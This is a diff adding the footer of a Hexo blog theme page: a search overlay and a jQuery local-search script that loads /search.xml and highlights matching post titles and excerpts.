+<script src="/js/backtotop.js"></script>
+
+
+
+      
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+    </div>
+  </body>
+</html>
